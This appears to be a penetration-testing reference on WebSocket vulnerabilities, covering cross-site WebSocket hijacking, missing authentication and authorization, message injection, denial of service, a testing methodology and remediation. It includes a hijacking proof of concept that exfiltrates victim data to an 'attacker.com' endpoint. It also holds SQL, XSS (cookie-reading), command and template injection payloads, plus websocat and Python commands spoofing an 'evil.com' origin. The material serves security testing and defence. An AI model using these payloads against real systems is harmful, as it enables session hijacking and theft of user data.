---
name: websocket-vulnerabilities
description: WebSocket security testing covering CSWSH, missing authentication, injection via messages, and authorization bypass techniques
---

# WebSocket Vulnerabilities

WebSocket connections upgrade from HTTP but operate outside many traditional security controls. Once established, the persistent bidirectional channel often lacks per-message authentication, authorization, input validation, and rate limiting. Attackers exploit the upgrade handshake, message handling, and session management to hijack connections, inject payloads, and access unauthorized data.

## Attack Surface

**Types**
- Cross-Site WebSocket Hijacking (CSWSH)
- Missing authentication on WebSocket upgrade
- Missing per-message authorization
- Injection attacks via WebSocket messages (SQLi, XSS, command injection)
- Information disclosure through WebSocket traffic
- Denial of service via message flooding
- Insecure WebSocket transport (ws:// instead of wss://)

**Contexts**
- Real-time applications (chat, notifications, dashboards), trading platforms, collaborative editors, gaming, IoT device communication, API streaming endpoints

**Frameworks**
- Socket.IO, ws (Node.js), Django Channels, Spring WebSocket, ActionCable (Rails), SignalR (.NET), Phoenix Channels (Elixir)

**Defenses to Bypass**
- Origin header validation, CSRF tokens in upgrade request, per-message auth tokens, rate limiting

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

WebSocket upgrade requests include cookies automatically. If the server does not validate the Origin header, an attacker's page can establish a WebSocket connection as the victim:

```html
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  ws.send(JSON.stringify({action: 'get_profile'}));
};
ws.onmessage = function(event) {
  // Exfiltrate data
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: event.data
  });
};
</script>
```

The victim's browser sends session cookies with the upgrade request, authenticating the attacker's WebSocket connection.

### Missing Authentication on Upgrade

Server accepts WebSocket upgrade without verifying session/token:
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
No cookie, no Authorization header, no token — connection still established.

### Missing Per-Message Authorization

Authentication checked only at connection time, not per message. After connecting, any message is processed regardless of the user's permissions:
```json
// Regular user sends admin-only action
{"action": "delete_user", "user_id": 123}

// Access another user's data
{"action": "get_messages", "channel": "admin-private"}
```

### Injection via WebSocket Messages

Messages processed server-side without sanitization:

**SQL Injection:**
```json
{"action": "search", "query": "' OR 1=1 --"}
```

**XSS (if messages are rendered in other users' browsers):**
```json
{"action": "chat", "message": "<img src=x onerror=alert(document.cookie)>"}
```

**Command Injection:**
```json
{"action": "ping", "host": "127.0.0.1; id"}
```

**Server-Side Template Injection:**
```json
{"action": "preview", "template": "{{7*7}}"}
```

### Information Disclosure

- Verbose error messages revealing server internals
- Debug/diagnostic data in WebSocket frames
- Broadcast messages leaking data to unauthorized subscribers
- Connection metadata (user lists, room membership) exposed without authorization

### Denial of Service

- No rate limiting on message frequency or size
- Large message frames exhausting server memory
- Rapid connect/disconnect cycles consuming resources
- Message amplification (small input triggers expensive server-side operations)

## Testing Methodology

1. **Identify WebSocket endpoints** — inspect network traffic for `ws://` or `wss://` connections; check for `Upgrade: websocket` in HTTP traffic
2. **Test Origin validation** — modify the Origin header in the upgrade request
3. **Test CSWSH** — create an HTML page on a different origin that opens a WebSocket to the target
4. **Test authentication** — attempt WebSocket connection without session cookies or tokens
5. **Test per-message authorization** — send messages requesting resources or actions beyond the authenticated user's permissions
6. **Test input validation** — inject SQLi, XSS, command injection, and SSTI payloads in message fields
7. **Test rate limiting** — send rapid bursts of messages and observe server behavior
8. **Inspect traffic** — analyze all WebSocket messages for sensitive data exposure

**Testing with curl/websocat:**
```bash
# Connect without cookies (test missing auth)
websocat wss://target.com/ws

# Connect with manipulated Origin
websocat -H "Origin: https://evil.com" wss://target.com/ws

# Send test messages
echo '{"action":"get_admin_data"}' | websocat wss://target.com/ws

# Using Python
python3 -c "
import websocket
ws = websocket.create_connection('wss://target.com/ws',
    cookie='session=stolen_or_none',
    origin='https://evil.com')
ws.send('{\"action\":\"get_profile\"}')
print(ws.recv())
ws.close()
"
```

**Browser Console Testing:**
```javascript
// Test from attacker origin (open browser console on any site)
let ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send(JSON.stringify({action: 'get_profile'}));
```

### Socket.IO Specific Testing

```javascript
// Socket.IO uses its own protocol on top of WebSocket
// Test namespace access
const socket = io('https://target.com/admin', {
  withCredentials: true,
  transports: ['websocket']
});

// Test event emission without authorization
socket.emit('admin:deleteUser', {userId: 123});

// Listen for events leaking data
socket.onAny((event, ...args) => {
  console.log(`Event: ${event}`, args);
});
```

## Indicators of Vulnerability

- WebSocket connection established from a cross-origin page without Origin validation (CSWSH)
- Connection succeeds without any authentication credentials
- Privileged actions succeed via WebSocket messages from unprivileged users
- Injection payloads (XSS, SQLi) in WebSocket messages execute or reflect
- Sensitive data (PII, tokens, internal IDs) transmitted in WebSocket frames
- No rate limiting — thousands of messages accepted per second without throttling
- `ws://` used instead of `wss://` (no TLS), allowing traffic interception

## Remediation

- Validate the `Origin` header during WebSocket upgrade; reject unexpected origins
- Require authentication tokens (not just cookies) in the upgrade request or first message
- Implement per-message authorization checks; verify user permissions for every action
- Sanitize and validate all data received via WebSocket messages (same rigor as HTTP input)
- Use `wss://` exclusively; never fall back to unencrypted `ws://`
- Implement rate limiting per connection and per IP
- Set maximum message size limits
- Use CSRF tokens or custom headers in the upgrade request as defense against CSWSH
- Log WebSocket messages for audit and anomaly detection
- Implement proper connection lifecycle management (timeouts, reconnection limits)

## Summary

WebSocket connections bypass many HTTP security controls by design. The persistent channel requires explicit authentication on upgrade, authorization per message, input validation on every frame, and Origin verification to prevent cross-site hijacking. Test WebSocket endpoints with the same rigor as REST APIs, plus the unique CSWSH and per-message authorization attack vectors.
